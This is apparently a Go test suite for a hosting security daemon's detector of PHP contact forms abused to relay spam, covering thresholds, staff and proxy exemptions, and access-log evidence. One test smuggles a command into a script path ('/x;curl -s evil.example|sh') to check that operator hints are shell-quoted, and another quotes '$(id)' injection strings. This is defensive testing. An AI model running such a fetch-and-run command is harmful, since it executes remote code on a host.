//go:build linux

package daemon

import (
	"context"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/pidginhost/csm/internal/alert"
	"github.com/pidginhost/csm/internal/checks"
	"github.com/pidginhost/csm/internal/config"
	"github.com/pidginhost/csm/internal/firewall"
)

const (
	path6IP     = "203.0.113.10"
	path6Ajax   = "/wp-admin/admin-ajax.php"
	path6Form   = "/index.php"
	path6Check  = "email_php_form_relay"
	path6Script = "email_php_form_relay_script"
)

var path6T0 = time.Unix(1_700_000_000, 0).UTC()

// path6Cfg is defaultPHPRelayCfg with Path 6 at its shipped defaults.
func path6Cfg() *config.Config {
	cfg := defaultPHPRelayCfg()
	cfg.EmailProtection.PHPRelay.IPRecipientSpread = 5
	cfg.EmailProtection.PHPRelay.IPRecipientWindowHours = 24
	return cfg
}

func path6Pipeline(t *testing.T, sites ...string) (*spoolPipeline, *[]alert.Finding) {
	t.Helper()
	prevRoot := formRelayDomlogRoot
	formRelayDomlogRoot = t.TempDir()
	t.Cleanup(func() { formRelayDomlogRoot = prevRoot })
	p, findings := fanoutPipeline(t, sites...)
	relay := &p.eng.config().EmailProtection.PHPRelay
	relay.IPRecipientSpread = 5
	relay.IPRecipientWindowHours = 24
	return p, findings
}

func path6Of(findings []alert.Finding, check string) []alert.Finding {
	var out []alert.Finding
	for _, f := range findings {
		if f.Check == check {
			out = append(out, f)
		}
	}
	return out
}

// feedVictims sends n form mails through script, one new outside victim each,
// spaced over the window. first numbers the first victim.
func feedVictims(t *testing.T, p *spoolPipeline, site, script, ip string, first, n int, start time.Time) {
	t.Helper()
	for i := first; i < first+n; i++ {
		feedScriptMail(t, p, fmt.Sprintf("v%d-%s", i, site), site, script, ip, start.Add(time.Duration(i)*30*time.Minute),
			fmt.Sprintf("victim%d@mail%d.example", i, i))
	}
}

func requireNoPath6(t *testing.T, findings []alert.Finding) {
	t.Helper()
	if got := append(path6Of(findings, path6Check), path6Of(findings, path6Script)...); len(got) != 0 {
		t.Fatalf("Path 6 fired: %+v", got)
	}
}

func TestPath6_FiresWhenClientMailsFiveOutsideAddresses(t *testing.T) {
	p, findings := path6Pipeline(t, "a")
	for i := 0; i < 5; i++ {
		feedScriptMail(t, p, fmt.Sprintf("m%d", i), "a", path6Ajax, path6IP, path6T0.Add(time.Duration(i)*45*time.Minute),
			fmt.Sprintf("victim%d@mail%d.example", i, i), "admin@site-a.example")
	}

	ipF := path6Of(*findings, path6Check)
	if len(ipF) != 1 {
		t.Fatalf("IP findings = %d, want 1: %+v", len(ipF), *findings)
	}
	f := ipF[0]
	wantMsg := "Path 6: client 203.0.113.10 made hosted sites mail 5 different outside addresses in 24h"
	if f.Severity != alert.High || f.Path != "form_relay" || f.SourceIP != path6IP || f.Message != wantMsg {
		t.Fatalf("IP finding = %+v", f)
	}
	if f.CPUser != "usera" || f.ScriptKey != "site-a.example:"+path6Ajax {
		t.Fatalf("IP finding account/script = %q %q", f.CPUser, f.ScriptKey)
	}
	for _, want := range []string{"site-a.example:" + path6Ajax, "usera", ": 5", "[Site] Please moderate a comment", "mail0.example", "mail4.example"} {
		if !strings.Contains(f.Details, want) {
			t.Errorf("IP finding details miss %q:\n%s", want, f.Details)
		}
	}
	if strings.Contains(f.Details, "@") {
		t.Errorf("IP finding details carry a full address:\n%s", f.Details)
	}

	sf := path6Of(*findings, path6Script)
	if len(sf) != 1 {
		t.Fatalf("script findings = %d, want 1: %+v", len(sf), *findings)
	}
	s := sf[0]
	k := "site-a.example:" + path6Ajax
	if s.Severity != alert.High || s.Path != "form_relay_script" || s.SourceIP != "" || s.ScriptKey != k ||
		s.CPUser != "usera" || s.Message != "Bots use "+k+" to mail outside addresses" {
		t.Fatalf("script finding = %+v", s)
	}
	for _, want := range []string{path6IP, "5 outside addresses through this script in 24h.", "captcha", "csm phprelay ignore-script '" + k + "'"} {
		if !strings.Contains(s.Details, want) {
			t.Errorf("script finding details miss %q:\n%s", want, s.Details)
		}
	}
}

// Later clients abusing the same form update the operator's script finding
// instead of minting a new one.
func TestPath6_ScriptFindingKeyStableAcrossClients(t *testing.T) {
	p, findings := path6Pipeline(t, "a")
	feedVictims(t, p, "a", path6Form, path6IP, 0, 5, path6T0)
	feedVictims(t, p, "a", path6Form, "198.51.100.20", 5, 5, path6T0.Add(25*time.Hour))
	got := path6Of(*findings, path6Script)
	if len(got) != 2 {
		t.Fatalf("script findings = %d, want 2 (one per window): %+v", len(got), got)
	}
	if got[0].Details == got[1].Details {
		t.Fatalf("details should name each client: %q", got[0].Details)
	}
	if got[0].Key() != got[1].Key() || got[0].Fingerprint() != got[1].Fingerprint() {
		t.Fatalf("script finding identity changed with the client: %q vs %q", got[0].Key(), got[1].Key())
	}
}

// Bots rotate addresses: each crossing client gets its own finding, the
// abused script only one per window.
func TestPath6_ScriptFindingOncePerWindowAcrossClients(t *testing.T) {
	p, findings := path6Pipeline(t, "a")
	feedVictims(t, p, "a", path6Form, path6IP, 0, 5, path6T0)
	feedVictims(t, p, "a", path6Form, "198.51.100.20", 5, 5, path6T0)
	if got := path6Of(*findings, path6Check); len(got) != 2 {
		t.Fatalf("IP findings = %d, want 2: %+v", len(got), got)
	}
	if got := path6Of(*findings, path6Script); len(got) != 1 {
		t.Fatalf("script findings = %d, want 1: %+v", len(got), got)
	}
}

func TestPath6_FourAddressesDoNotFire(t *testing.T) {
	p, findings := path6Pipeline(t, "a")
	feedVictims(t, p, "a", path6Form, path6IP, 0, 4, path6T0)
	requireNoPath6(t, *findings)
}

func TestPath6_OwnDomainRecipientsNotCounted(t *testing.T) {
	p, findings := path6Pipeline(t, "a")
	for i := 0; i < 6; i++ {
		feedScriptMail(t, p, fmt.Sprintf("m%d", i), "a", path6Form, path6IP, path6T0.Add(time.Duration(i)*time.Minute),
			fmt.Sprintf("staff%d@site-a.example", i))
	}
	requireNoPath6(t, *findings)
}

func TestPath6_StaffAdminScriptExemptsIP(t *testing.T) {
	p, findings := path6Pipeline(t, "a")
	feedScriptMail(t, p, "admin", "a", "/wp-admin/post.php", path6IP, path6T0, "buyer@mail.example")
	feedVictims(t, p, "a", path6Form, path6IP, 1, 6, path6T0)
	requireNoPath6(t, *findings)
}

func TestPath6_StaffExemptionIsPerAccount(t *testing.T) {
	p, findings := path6Pipeline(t, "a", "b")
	feedScriptMail(t, p, "admin", "a", "/wp-admin/post.php", path6IP, path6T0, "buyer@mail.example")
	feedVictims(t, p, "b", path6Form, path6IP, 1, 5, path6T0)
	if got := path6Of(*findings, path6Check); len(got) != 1 || got[0].CPUser != "userb" {
		t.Fatalf("staff on another account must not exempt the client: %+v", *findings)
	}
}

func TestPath6_AdminAjaxDoesNotGrantStaff(t *testing.T) {
	p, findings := path6Pipeline(t, "a")
	feedScriptMail(t, p, "ajax", "a", path6Ajax, path6IP, path6T0, "admin@site-a.example")
	feedVictims(t, p, "a", path6Form, path6IP, 1, 5, path6T0)
	if got := path6Of(*findings, path6Check); len(got) != 1 {
		t.Fatalf("admin-ajax.php mail must not exempt the client: %+v", *findings)
	}
}

func TestPath6_PathInfoCannotFakeStaff(t *testing.T) {
	p, findings := path6Pipeline(t, "a")
	feedScriptMail(t, p, "fake", "a", "/wp-admin/admin-ajax.php/post.php", path6IP, path6T0, "admin@site-a.example")
	feedVictims(t, p, "a", path6Form, path6IP, 1, 5, path6T0)
	if got := path6Of(*findings, path6Check); len(got) != 1 {
		t.Fatalf("PATH_INFO naming an admin page must not exempt the client: %+v", *findings)
	}
}

func TestPath6_ProxyRangeIPNotCounted(t *testing.T) {
	p, findings := path6Pipeline(t, "a")
	pol := newTestPoliciesWithProxy(t, "203.0.113.0/24")
	p.policies = pol
	p.eng.SetPolicies(pol)
	feedVictims(t, p, "a", path6Form, path6IP, 0, 6, path6T0)
	requireNoPath6(t, *findings)
}

func TestPath6_CloudflareCoveredIPNotCounted(t *testing.T) {
	p, findings := path6Pipeline(t, "a")
	checks.SetCloudflareNets([]string{path6IP + "/32"})
	t.Cleanup(func() { checks.SetCloudflareNets(nil) })
	feedVictims(t, p, "a", path6Form, path6IP, 0, 6, path6T0)
	requireNoPath6(t, *findings)
}

// The daemon's Cloudflare refresh, fresh or from its cached state, feeds the
// set checks.IsInfraIP reads, so Path 6 skips edges with no hook of its own.
// An operator proxy file without Cloudflare cannot change that.
func TestPath6_CloudflareEdgeSkippedThroughDaemonRefresh(t *testing.T) {
	orig := fetchCloudflareIPs
	t.Cleanup(func() {
		fetchCloudflareIPs = orig
		checks.SetCloudflareNets(nil)
	})
	for name, fetchErr := range map[string]error{"fresh": nil, "cached": os.ErrDeadlineExceeded} {
		t.Run(name, func(t *testing.T) {
			checks.SetCloudflareNets(nil)
			state := t.TempDir()
			if err := firewall.SaveCFState(state, []string{"203.0.113.0/24"}, []string{"2001:db8:cf::/48"}, path6T0); err != nil {
				t.Fatal(err)
			}
			fetchCloudflareIPs = func(context.Context) ([]string, []string, error) {
				if fetchErr != nil {
					return nil, nil, fetchErr
				}
				return []string{"203.0.113.0/24"}, []string{"2001:db8:cf::/48"}, nil
			}
			(&Daemon{cfg: &config.Config{StatePath: state}}).refreshCloudflareIPs(context.Background())
			for _, ip := range []string{path6IP, "2001:db8:cf::7"} {
				p, findings := path6Pipeline(t, "a")
				p.policies = newTestPoliciesWithProxy(t, "192.0.2.0/24")
				p.eng.SetPolicies(p.policies)
				feedVictims(t, p, "a", path6Form, ip, 0, 6, path6T0)
				requireNoPath6(t, *findings)
				if len(p.eng.form.ips) != 0 {
					t.Fatalf("Cloudflare edge %s was counted", ip)
				}
			}
		})
	}
}

func TestPath6_InfraIPNotCounted(t *testing.T) {
	p, findings := path6Pipeline(t, "a")
	p.eng.config().InfraIPs = []string{"203.0.113.0/28"}
	feedVictims(t, p, "a", path6Form, path6IP, 0, 6, path6T0)
	requireNoPath6(t, *findings)
}

func TestPath6_DomainLookupFailureNotCounted(t *testing.T) {
	p, findings := path6Pipeline(t, "b") // usera has no userdata file
	feedVictims(t, p, "a", path6Form, path6IP, 0, 6, path6T0)
	requireNoPath6(t, *findings)
	if len(p.eng.form.ips) != 0 {
		t.Fatalf("mail without ownership data was counted: %d clients", len(p.eng.form.ips))
	}
}

func TestPath6_UnparsableRecipientCounts(t *testing.T) {
	p, findings := path6Pipeline(t, "a")
	feedVictims(t, p, "a", path6Form, path6IP, 0, 4, path6T0)
	feedScriptMail(t, p, "broken", "a", path6Form, path6IP, path6T0.Add(3*time.Hour), `"broken@mail.example`)
	if got := path6Of(*findings, path6Check); len(got) != 1 {
		t.Fatalf("an unparsable recipient must count as a new one: %+v", *findings)
	}
}

func TestPath6_UnparsableMessagesCountSeparately(t *testing.T) {
	p, findings := path6Pipeline(t, "a")
	feedVictims(t, p, "a", path6Form, path6IP, 0, 3, path6T0)
	feedScriptMail(t, p, "broken1", "a", path6Form, path6IP, path6T0.Add(3*time.Hour), `"broken@mail.example`)
	feedScriptMail(t, p, "broken2", "a", path6Form, path6IP, path6T0.Add(4*time.Hour), `"broken@mail.example`)
	if got := path6Of(*findings, path6Check); len(got) != 1 {
		t.Fatalf("each unparsable message must count once: %+v", *findings)
	}
}

func TestPath6_FiresOncePerWindow(t *testing.T) {
	p, findings := path6Pipeline(t, "a")
	feedVictims(t, p, "a", path6Form, path6IP, 0, 7, path6T0)
	if got := path6Of(*findings, path6Check); len(got) != 1 {
		t.Fatalf("IP findings = %d, want 1: %+v", len(got), got)
	}
	if got := path6Of(*findings, path6Script); len(got) != 1 {
		t.Fatalf("script findings = %d, want 1: %+v", len(got), got)
	}
}

func TestPath6_DisabledWhenSpreadZero(t *testing.T) {
	p, findings := path6Pipeline(t, "a")
	p.eng.config().EmailProtection.PHPRelay.IPRecipientSpread = 0
	feedVictims(t, p, "a", path6Form, path6IP, 0, 6, path6T0)
	requireNoPath6(t, *findings)
}

func TestPath6_IgnoredScriptSuppressed(t *testing.T) {
	p, findings := path6Pipeline(t, "a")
	p.ignores = newIgnoreList()
	p.ignores.Add("site-a.example:"+path6Form, time.Time{}, "test", "bulk sender")
	feedVictims(t, p, "a", path6Form, path6IP, 0, 6, path6T0)
	requireNoPath6(t, *findings)
}

func TestPath6_IPv6CountsPerSlash64(t *testing.T) {
	p, findings := path6Pipeline(t, "a")
	for i := 0; i < 6; i++ {
		ip := "2001:db8::1"
		if i%2 == 1 {
			ip = "2001:db8::2"
		}
		feedScriptMail(t, p, fmt.Sprintf("m%d", i), "a", path6Form, ip, path6T0.Add(time.Duration(i)*time.Minute),
			fmt.Sprintf("victim%d@mail%d.example", i, i))
	}
	got := path6Of(*findings, path6Check)
	if len(got) != 1 {
		t.Fatalf("IP findings = %d, want 1: %+v", len(got), *findings)
	}
	// The fifth message crossed, from ::1.
	if got[0].SourceIP != "2001:db8::1" || !strings.Contains(got[0].Message, "client 2001:db8::1 ") {
		t.Fatalf("finding must name the exact address that crossed: %+v", got[0])
	}
}

func TestPath6_ScriptFindingOnlyForScriptsWithTwoRecipients(t *testing.T) {
	p, findings := path6Pipeline(t, "a", "b")
	feedVictims(t, p, "a", path6Form, path6IP, 0, 4, path6T0)
	feedVictims(t, p, "b", "/contact.php", path6IP, 4, 1, path6T0)
	if got := path6Of(*findings, path6Check); len(got) != 1 || got[0].ScriptKey != "site-b.example:/contact.php" {
		t.Fatalf("IP finding = %+v, want one from the crossing script", got)
	}
	got := path6Of(*findings, path6Script)
	if len(got) != 1 || got[0].ScriptKey != "site-a.example:"+path6Form || got[0].CPUser != "usera" {
		t.Fatalf("script findings = %+v, want only site-a's form", got)
	}
}

func TestPath6_RebuildEmitsNothing(t *testing.T) {
	p, findings := path6Pipeline(t, "a")
	p.SetRebuilding(true)
	feedVictims(t, p, "a", path6Form, path6IP, 0, 5, path6T0)
	p.SetRebuilding(false)
	if len(*findings) != 0 {
		t.Fatalf("rebuild emitted findings: %+v", *findings)
	}
	if got := p.eng.form.evaluate(formRelayKey(path6IP), path6T0.Add(2*time.Hour), 24*time.Hour, 1, nil, false).Count; got != 5 {
		t.Fatalf("rebuild recorded %d recipients, want 5", got)
	}
	feedVictims(t, p, "a", path6Form, path6IP, 5, 1, path6T0)
	if got := path6Of(*findings, path6Check); len(got) != 1 {
		t.Fatalf("first live mail after rebuild must fire: %+v", *findings)
	}
}

func TestPath6_RecipientCaseFolded(t *testing.T) {
	p, findings := path6Pipeline(t, "a")
	feedVictims(t, p, "a", path6Form, path6IP, 0, 4, path6T0)
	feedScriptMail(t, p, "dup", "a", path6Form, path6IP, path6T0.Add(3*time.Hour), "Victim0@MAIL0.Example")
	requireNoPath6(t, *findings)
}

func TestPath6_ThresholdChangeAppliesWithoutRestart(t *testing.T) {
	prev := config.Active()
	t.Cleanup(func() { config.SetActive(prev) })
	p, findings := path6Pipeline(t, "a")
	config.SetActive(path6Cfg())
	feedVictims(t, p, "a", path6Form, path6IP, 0, 3, path6T0)
	requireNoPath6(t, *findings)

	lowered := path6Cfg()
	lowered.EmailProtection.PHPRelay.IPRecipientSpread = 3
	config.SetActive(lowered)
	feedVictims(t, p, "a", path6Form, path6IP, 3, 1, path6T0)
	got := path6Of(*findings, path6Check)
	if len(got) != 1 || !strings.Contains(got[0].Message, " mail 3 different ") {
		t.Fatalf("lowered spread must fire on the next mail: %+v", *findings)
	}
}

func TestPath6_NoClientIPNotCounted(t *testing.T) {
	p, findings := path6Pipeline(t, "a")
	feedVictims(t, p, "a", path6Form, "", 0, 6, path6T0)
	requireNoPath6(t, *findings)
}

// Scheduled jobs mail whatever their trigger request queued; the recipients
// are not that request's input, so wp-cron.php never counts.
func TestPath6_WpCronNotCounted(t *testing.T) {
	for _, script := range []string{"/wp-cron.php", "/blog/wp-cron.php"} {
		t.Run(script, func(t *testing.T) {
			p, findings := path6Pipeline(t, "a")
			feedVictims(t, p, "a", script, path6IP, 0, 6, path6T0)
			requireNoPath6(t, *findings)
		})
	}
}

func TestIsAuthenticatedAdminScript(t *testing.T) {
	for k, want := range map[scriptKey]bool{
		"site-a.example:/wp-admin/post.php":                  true,
		"site-a.example:/wp-admin/edit.php":                  true,
		"site-a.example:/shop/wp-admin/edit.php":             true,
		"site-a.example:/WP-ADMIN/Post.php":                  true,
		"site-a.example:/wp-admin/post.php/extra":            true,
		"site-a.example:/wp-admin/admin-ajax.php":            false,
		"site-a.example:/wp-admin/admin-post.php":            false,
		"site-a.example:/wp-admin/profile.php":               false,
		"site-a.example:/wp-admin/index.php":                 false,
		"site-a.example:/wp-admin/admin-ajax.php/post.php":   false,
		"site-a.example:/index.php/wp-admin/post.php":        false,
		"site-a.example:/wp-admin/network/users.php":         false,
		"site-a.example:/xwp-admin/post.php":                 false,
		"site-a.example:/wp-adminx/post.php":                 false,
		"site-a.example:/wp-admin/.php":                      false,
		"site-a.example:/wp-admin/":                          false,
		"site-a.example:/":                                   false,
		"wp-admin:/post.php":                                 false,
		"site-a.example:/wp-content/plugins/x/wp-admin/a.js": false,
	} {
		if got := isAuthenticatedAdminScript(k); got != want {
			t.Errorf("isAuthenticatedAdminScript(%q) = %v, want %v", k, got, want)
		}
	}
}

func TestIsWPCronScript(t *testing.T) {
	for k, want := range map[scriptKey]bool{
		"site-a.example:/wp-cron.php":             true,
		"site-a.example:/blog/wp-cron.php":        true,
		"site-a.example:/wp-cron.php/extra":       true,
		"site-a.example:/my-wp-cron.php":          false,
		"site-a.example:/contact.php/wp-cron.php": false,
		"site-a.example:/WP-CRON.PHP":             true,
		"wp-cron.php:/index.php":                  false,
	} {
		if got := isWPCronScript(k); got != want {
			t.Errorf("isWPCronScript(%q) = %v, want %v", k, got, want)
		}
	}
}

func TestSweepFormRelay_ReportsFullTableOncePerDay(t *testing.T) {
	m := newPHPRelayMetrics()
	eng := newEvaluator(newPerScriptWindow(), newPerIPWindow(64), newPerAccountWindow(5000), path6Cfg(), m)
	d := &Daemon{alertCh: make(chan alert.Finding, 4)}
	before := m.FormRelayEvictions.Value()
	n := 0
	add := func(at time.Time) {
		ip := fmt.Sprintf("2001:db8:%x:%x::1", n/0x10000, n%0x10000)
		n++
		eng.form.record(formRelayKey(ip), "usera", formTestA, "m", at, []string{"v@victim.example"}, false, 24*time.Hour, 5)
	}
	reports := func() int {
		got := 0
		for {
			select {
			case f := <-d.alertCh:
				if f.Check != "email_php_form_relay_table_full" || f.Severity != alert.Warning {
					t.Fatalf("unexpected finding %+v", f)
				}
				got++
			default:
				return got
			}
		}
	}

	for n <= formRelayMaxIPs {
		add(formTestT0)
	}
	last := sweepFormRelay(d, eng, formTestT0, time.Time{})
	if got := reports(); got != 1 || !last.Equal(formTestT0) {
		t.Fatalf("first full sweep: reports=%d last=%v", got, last)
	}
	add(formTestT0)
	if last = sweepFormRelay(d, eng, formTestT0.Add(5*time.Minute), last); reports() != 0 {
		t.Fatal("full table reported twice in one day")
	}
	add(formTestT0.Add(5 * time.Minute))
	if last = sweepFormRelay(d, eng, formTestT0.Add(24*time.Hour), last); reports() != 1 {
		t.Fatal("full table not reported again after a day")
	}
	if sweepFormRelay(d, eng, formTestT0.Add(49*time.Hour), last); reports() != 0 {
		t.Fatal("reported a full table without a new eviction")
	}
	if got := m.FormRelayEvictions.Value() - before; got != 3 {
		t.Fatalf("eviction metric grew by %v, want 3", got)
	}
}

// PHP_SELF carries PATH_INFO and SERVER_NAME follows the Host header, so one
// form reaches the spool under many names. Path 6 must see one script.
func TestPath6_ScriptVariantsAreOneScript(t *testing.T) {
	const id = "site-a.example:" + path6Ajax
	for name, variant := range map[string]func(i int) (host, script string){
		"path info": func(i int) (string, string) { return "site-a.example", fmt.Sprintf("%s/%d", path6Ajax, i) },
		"host case": func(i int) (string, string) {
			return []string{"Site-A.example", "SITE-A.EXAMPLE", "site-a.Example", "sItE-a.example", "site-A.example"}[i], path6Ajax
		},
	} {
		t.Run(name, func(t *testing.T) {
			p, findings := path6Pipeline(t, "a")
			feed := func(ip string, first int, at time.Time) {
				for i := 0; i < 5; i++ {
					host, script := variant(i)
					n := first + i
					feedHostMail(t, p, fmt.Sprintf("m%d", n), "usera", host, script, ip, at.Add(time.Duration(i)*time.Minute),
						fmt.Sprintf("victim%d@mail%d.example", n, n))
				}
			}
			feed(path6IP, 0, path6T0)
			clients, scripts := path6Of(*findings, path6Check), path6Of(*findings, path6Script)
			if len(clients) != 1 || clients[0].ScriptKey != id || !strings.Contains(clients[0].Details, id+" (account usera): 5") {
				t.Fatalf("client findings = %+v, want one naming %s", clients, id)
			}
			if len(scripts) != 1 || scripts[0].ScriptKey != id || scripts[0].DedupKey != id {
				t.Fatalf("script findings = %+v, want one for %s", scripts, id)
			}
			// Flow E's routine script sweep must not reset the script cooldown.
			p.eng.scripts.SweepIdle(path6T0.Add(time.Hour - 25*time.Hour))
			feed("198.51.100.20", 5, path6T0.Add(2*time.Hour))
			if got := path6Of(*findings, path6Check); len(got) != 2 {
				t.Fatalf("client findings = %d, want 2", len(got))
			}
			if got := path6Of(*findings, path6Script); len(got) != 1 {
				t.Fatalf("script findings = %+v, want still one per window", got)
			}
		})
	}
}

// One ignore-script on the name a finding prints covers every variant of
// that form, before and after it was added; ignores on a raw name still work.
func TestPath6_IgnoreCoversScriptVariants(t *testing.T) {
	variants := []struct{ host, script string }{
		{"site-a.example", path6Ajax + "/0"}, {"Site-A.example", path6Ajax}, {"SITE-A.EXAMPLE", path6Ajax + "/x"},
		{"site-a.example", "/WP-ADMIN/admin-ajax.php"}, {"site-a.example", path6Ajax + "/post.php"}, {"site-a.example", path6Ajax},
	}
	t.Run("new mail", func(t *testing.T) {
		p, findings := path6Pipeline(t, "a")
		p.ignores = newIgnoreList()
		p.ignores.Add("site-a.example:"+path6Ajax, time.Time{}, "test", "bulk sender")
		for i, v := range variants {
			feedHostMail(t, p, fmt.Sprintf("m%d", i), "usera", v.host, v.script, path6IP, path6T0.Add(time.Duration(i)*time.Minute),
				fmt.Sprintf("victim%d@mail%d.example", i, i))
		}
		requireNoPath6(t, *findings)
		if len(p.eng.form.ips) != 0 {
			t.Fatalf("ignored variants were counted: %d clients", len(p.eng.form.ips))
		}
	})
	t.Run("earlier mail", func(t *testing.T) {
		p, findings := path6Pipeline(t, "a", "b")
		for i, v := range variants[:4] {
			feedHostMail(t, p, fmt.Sprintf("m%d", i), "usera", v.host, v.script, path6IP, path6T0.Add(time.Duration(i)*time.Minute),
				fmt.Sprintf("victim%d@mail%d.example", i, i))
		}
		p.ignores = newIgnoreList()
		p.ignores.Add("site-a.example:"+path6Ajax, time.Time{}, "test", "bulk sender")
		feedVictims(t, p, "b", path6Form, path6IP, 4, 1, path6T0)
		requireNoPath6(t, *findings)
	})
	t.Run("raw name", func(t *testing.T) {
		p, findings := path6Pipeline(t, "a")
		p.ignores = newIgnoreList()
		p.ignores.Add("Site-A.example:"+path6Ajax+"/0", time.Time{}, "test", "bulk sender")
		for i := 0; i < 6; i++ {
			feedHostMail(t, p, fmt.Sprintf("m%d", i), "usera", "Site-A.example", path6Ajax+"/0", path6IP, path6T0.Add(time.Duration(i)*time.Minute),
				fmt.Sprintf("victim%d@mail%d.example", i, i))
		}
		requireNoPath6(t, *findings)
	})
}

// PATH_INFO is client text. The ignore-script hint an operator may paste
// into a root shell must carry only the quoted script id.
func TestPath6_ScriptHintCarriesOnlyQuotedScriptID(t *testing.T) {
	p, findings := path6Pipeline(t, "a")
	feedVictims(t, p, "a", path6Ajax+"/x;curl -s evil.example|sh", path6IP, 0, 5, path6T0)
	scripts := path6Of(*findings, path6Script)
	if len(scripts) != 1 {
		t.Fatalf("script findings = %+v, want one", scripts)
	}
	s := scripts[0]
	const hint = "csm phprelay ignore-script 'site-a.example:/wp-admin/admin-ajax.php'"
	if !strings.HasSuffix(s.Details, hint) {
		t.Fatalf("script details do not end with the quoted hint:\n%s", s.Details)
	}
	for _, f := range path6Of(*findings, path6Check) {
		s.Message, s.Details = s.Message+f.Message+f.ScriptKey, s.Details+f.Details
	}
	for _, attacker := range []string{"curl", "evil", ";", "|", "/x"} {
		if strings.Contains(s.Message+s.Details+s.ScriptKey+s.DedupKey, attacker) {
			t.Fatalf("finding text carries client text %q:\n%s\n%s", attacker, s.Message, s.Details)
		}
	}
}

func TestShellQuote(t *testing.T) {
	for in, want := range map[string]string{
		"site-a.example:/index.php": `'site-a.example:/index.php'`,
		"a'b":                       `'a'\''b'`,
		"$(id) `id`":                `'$(id) ` + "`id`'",
	} {
		if got := shellQuote(in); got != want {
			t.Errorf("shellQuote(%q) = %s, want %s", in, got, want)
		}
	}
}

// writeDomlog writes a cPanel access log for user under the test domlog root.
func writeDomlog(t *testing.T, user, file string, lines ...string) {
	t.Helper()
	dir := filepath.Join(formRelayDomlogRoot, user)
	if err := os.MkdirAll(dir, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(dir, file), []byte(strings.Join(lines, "\n")+"\n"), 0o644); err != nil {
		t.Fatal(err)
	}
}

func domlogLine(ip, method, target string, status int) string {
	return fmt.Sprintf(`%s - - [05/Nov/2026:10:00:00 +0000] "%s %s HTTP/1.1" %d 512 "-" "Mozilla/5.0"`, ip, method, target, status)
}

// A shop owner completing orders from the order list mails each buyer
// through admin-ajax.php, never through an admin page. Loading an admin page
// that needs a login shows in the site's access log and makes the owner
// staff, so the quick actions do not challenge or block them.
func TestPath6_AdminPageInAccessLogMakesStaff(t *testing.T) {
	for _, tc := range []struct{ host, file, ip, logIP string }{
		{"site-a.example", "site-a.example-ssl_log", path6IP, path6IP},
		{"www.site-a.example", "site-a.example", path6IP, path6IP},
		{"site-a.example", "site-a.example-ssl_log", "2001:db8::1", "2001:db8::2"},
	} {
		t.Run(tc.host+"/"+tc.logIP, func(t *testing.T) {
			p, findings := path6Pipeline(t, "a")
			writeDomlog(t, "usera", tc.file,
				domlogLine("198.51.100.30", "GET", "/", 200),
				domlogLine(tc.logIP, "GET", "/wp-admin/edit.php?post_type=shop_order", 200))
			for i := 0; i < 6; i++ {
				feedHostMail(t, p, fmt.Sprintf("m%d", i), "usera", tc.host, path6Ajax, tc.ip, path6T0.Add(time.Duration(i)*time.Minute),
					fmt.Sprintf("buyer%d@mail%d.example", i, i))
			}
			requireNoPath6(t, *findings)
			if !p.eng.form.isStaff("usera", formRelayKey(tc.ip), path6T0.Add(time.Hour)) {
				t.Fatal("access log evidence did not make the client staff")
			}
		})
	}
}

func TestPath6_AccessLogWithoutAdminPageIsNoEvidence(t *testing.T) {
	for name, tc := range map[string]struct {
		client string
		lines  []string
	}{
		"login redirect":  {path6IP, []string{domlogLine(path6IP, "GET", "/wp-admin/edit.php", 302), domlogLine(path6IP, "GET", "/wp-login.php?redirect_to=x", 200)}},
		"admin-ajax":      {path6IP, []string{domlogLine(path6IP, "GET", "/wp-admin/admin-ajax.php?action=x", 200)}},
		"profile":         {path6IP, []string{domlogLine(path6IP, "GET", "/wp-admin/profile.php", 200)}},
		"dashboard":       {path6IP, []string{domlogLine(path6IP, "GET", "/wp-admin/index.php", 200), domlogLine(path6IP, "GET", "/wp-admin/", 200)}},
		"post":            {path6IP, []string{domlogLine(path6IP, "POST", "/wp-admin/edit.php", 200)}},
		"path info":       {path6IP, []string{domlogLine(path6IP, "GET", "/wp-admin/admin-ajax.php/edit.php", 200)}},
		"other client":    {path6IP, []string{domlogLine("198.51.100.20", "GET", "/wp-admin/edit.php", 200)}},
		"other /64":       {"2001:db8::1", []string{domlogLine("2001:db8:0:1::1", "GET", "/wp-admin/edit.php", 200)}},
		"forged fragment": {path6IP, []string{"junk " + domlogLine(path6IP, "GET", "/wp-admin/edit.php", 200)}},
	} {
		t.Run(name, func(t *testing.T) {
			p, findings := path6Pipeline(t, "a")
			writeDomlog(t, "usera", "site-a.example-ssl_log", tc.lines...)
			feedVictims(t, p, "a", path6Ajax, tc.client, 0, 5, path6T0)
			if got := path6Of(*findings, path6Check); len(got) != 1 {
				t.Fatalf("client findings = %d, want 1", len(got))
			}
		})
	}
}

func TestPath6_MissingOrUnreadableAccessLogFires(t *testing.T) {
	for name, setup := range map[string]func(t *testing.T){
		"no account dir": func(*testing.T) {},
		"no log": func(t *testing.T) {
			writeDomlog(t, "usera", "other.example", domlogLine(path6IP, "GET", "/wp-admin/edit.php", 200))
		},
		"unreadable": func(t *testing.T) {
			if err := os.MkdirAll(filepath.Join(formRelayDomlogRoot, "usera", "site-a.example-ssl_log"), 0o755); err != nil {
				t.Fatal(err)
			}
		},
	} {
		t.Run(name, func(t *testing.T) {
			p, findings := path6Pipeline(t, "a")
			setup(t)
			feedVictims(t, p, "a", path6Ajax, path6IP, 0, 5, path6T0)
			if got := path6Of(*findings, path6Check); len(got) != 1 {
				t.Fatalf("client findings = %d, want 1", len(got))
			}
		})
	}
}

// Only the tail of a log is read, and the line the tail starts inside does
// not count: its visible part may be client text that looks like a line.
func TestPath6_AccessLogReadIsBounded(t *testing.T) {
	staff := domlogLine(path6IP, "GET", "/wp-admin/edit.php", 200)
	filler := strings.Repeat("x", formRelayDomlogTail)
	for name, lines := range map[string][]string{
		"before the tail": {staff, filler},
		"cut first line":  {"198.51.100.9 " + staff, filler[:formRelayDomlogTail-len(staff)-2]},
		"overlong line":   {filler[:formRelayDomlogLine] + staff},
	} {
		t.Run(name, func(t *testing.T) {
			p, findings := path6Pipeline(t, "a")
			writeDomlog(t, "usera", "site-a.example-ssl_log", lines...)
			feedVictims(t, p, "a", path6Ajax, path6IP, 0, 5, path6T0)
			if got := path6Of(*findings, path6Check); len(got) != 1 {
				t.Fatalf("client findings = %d, want 1", len(got))
			}
		})
	}
	p, findings := path6Pipeline(t, "a")
	writeDomlog(t, "usera", "site-a.example-ssl_log", filler, staff)
	feedVictims(t, p, "a", path6Ajax, path6IP, 0, 5, path6T0)
	requireNoPath6(t, *findings)
}

